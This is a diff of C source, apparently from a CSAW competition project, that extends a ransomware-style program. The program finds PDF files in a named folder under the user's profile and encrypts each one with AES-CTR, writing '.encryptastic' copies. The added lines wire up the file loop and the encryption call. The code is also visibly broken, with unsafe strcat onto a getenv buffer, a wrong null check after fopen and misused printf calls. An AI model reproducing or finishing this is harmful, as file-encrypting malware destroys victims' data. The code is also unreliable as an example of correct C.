@@ -72,26 +72,34 @@ Struct Gin(){
 
 
 // AES-CTR
-int inkripshun(FILE *infile, Struct *mats){
+int inkripshun(char* infilename, Struct *mats){
 
     printf("In inkripshun");
+    FILE *infile;
     FILE *outfile;
 
-    infile = fopen("", "rb");
-         if (!infile) {
+    infile = fopen(infilename, "rb");
+         if (!infilename) {
         /* Unable to open file for reading */
         fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
         return errno;
     };
 
+    char outfileName[strlen(infilename) + 13];
+    strcpy(outfileName,infilename);
+    strcat(outfileName,".encryptastic");
+
     // Hash contents
     // What hash do we want to use?
-
+    /*
     unsigned char outfileName[HASH_BUFSIZE];
     SHA256_CTX sha256;
     SHA256_Init(&sha256);
-
     // Implement rest of hash here..
+    outfileName = "";
+    */
+
+
     outfile = fopen(outfileName, "wb");
     if (!outfile) {
         /* Unable to open file for writing */
@@ -121,6 +129,9 @@ int inkripshun(FILE *infile, Struct *mats){
                 ERR_error_string(ERR_get_error(), NULL));
         cleanup(mats, infile, outfile, ERR_EVP_CIPHER_INIT);
     }
+
+    printf(EVP_CIPHER_CTX_key_length(ctx));
+    printf(EVP_CIPHER_CTX_iv_length(ctx));
 
     OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == AES_KEY_SIZE);
     OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == CHUNK_SIZE);
@@ -215,24 +226,22 @@ int main(){
     Struct key_iv = Gin();
 
     // Check CWD name
-    const char* directoryPath = strcat(getenv("USERPROFILE"),"\\SecretCSAWDocuments\\");
+    char* directoryPath = strcat(getenv("USERPROFILE"),"\\SecretCSAWDocuments\\");    
+    char directoryDupe[strlen(directoryPath) + 1];
+    strcpy(directoryDupe, directoryPath);
 
     if (PathFileExistsA(directoryPath)) {
         // Loop through files in directory
         WIN32_FIND_DATA data;
-        HANDLE hFind = FindFirstFile(strcat(directoryPath,"*.pdf"), &data);
+        HANDLE hFind = FindFirstFile(strcat(directoryPath, "*.pdf"), &data);
         if( hFind != INVALID_HANDLE_VALUE){
             do{
                 printf("%s\n",data.cFileName);
+                inkripshun(strcat(directoryDupe,data.cFileName), &key_iv);
             } while (FindNextFile(hFind, &data));
             FindClose(hFind);
-        }
-        
-        // Check if PDF?
-        if (isPDF(nextFile)){
-            // Encrypt
-            inkripshun(nextFile, &key_iv);
         };
+
     } else {
         printf("Did not find the CSAW secret directory.\n");
     }
